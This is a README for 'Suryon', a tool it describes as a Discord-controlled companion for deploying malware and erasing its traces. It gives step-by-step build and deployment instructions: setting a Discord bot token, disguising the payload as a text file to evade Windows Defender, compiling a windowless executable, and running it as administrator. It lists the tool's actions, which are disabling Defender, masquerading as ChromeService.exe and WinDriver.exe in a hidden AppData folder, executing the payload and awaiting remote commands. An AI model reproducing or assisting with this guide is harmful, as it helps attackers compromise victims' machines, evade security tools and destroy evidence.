## 🧠 What is Suryon?

**Suryon** is a stealth-deployed, Discord-commanded cleanup utility that rides alongside your payload.  
It's not the malware — it's the *clean exit.*

When you're done running your tool and need to erase all traces — **you call Suryon**.  
It listens. It acts. It *vanishes*.

---

## ❗ Why Suryon?

We all have malwares.  
We all want to deploy them.  
But the real problem?

> ❌ They leave traces.  
> ❌ You can’t clean up remotely.  
> ❌ You need to touch the machine again.  
> ❌ You risk getting caught.

**Not anymore.**

Suryon is your **last command**.  
Your **digital assassin**.  
Your **auto-eraser** from a Discord whisper.

# 🔥 Two Roads: Techies vs Non-Techies

---

## 🧪 Guide for Techies

### 🛠 Step-by-Step:

1. Clone the repo:
    ```bash
    git clone https://github.com/yourusername/suryon
    cd suryon
    ```

2. **Either:**
   - 🔹 Manually edit `main_template.py`:
     ```python
     DISCORD_TOKEN = 'your_token'
     CHANNEL_ID = 123456789012345678
     ```
   - 🔹 OR run the GUI Builder:
     ```bash
     GUI_BUILDER.exe
     ```

3. Drop your malware as `payload.txt` in the same folder.  
   *(This avoids detection by Windows Defender)*

4. Compile manually (if not using GUI_BUILDER):
    ```bash
    pyinstaller --onefile --noconsole --icon=icon1.ico main_template.py
    ```

5. Now you have **two files**:
    - `main_final.exe` or `main_template.exe` → Suryon
    - `payload.txt` → your malware

6. Rename and place:
    ```
    main_final.exe → Suryon.exe
    payload.txt → payload.txt
    ```

7. Put both in the same directory.

8. ⚠️ **RUN `Suryon.exe` AS ADMINISTRATOR**

---

### 🚀 What Happens When You Run It?

1. 🔐 Disables Windows Defender  
2. 🔃 Renames `payload.txt` → `payload.exe` → `ChromeService.exe`  
3. 🌀 Renames `Suryon.exe` → `WinDriver.exe`  
4. 📦 Moves both to `%APPDATA%\AdobeSync\`  
5. 🫥 Hides the folder  
6. 💣 Executes `ChromeService.exe`  
7. 🎮 Waits for commands on Discord

7. ⚠️ **Run Suryon.exe as Administrator**

That’s it. Everything else is **automated.**
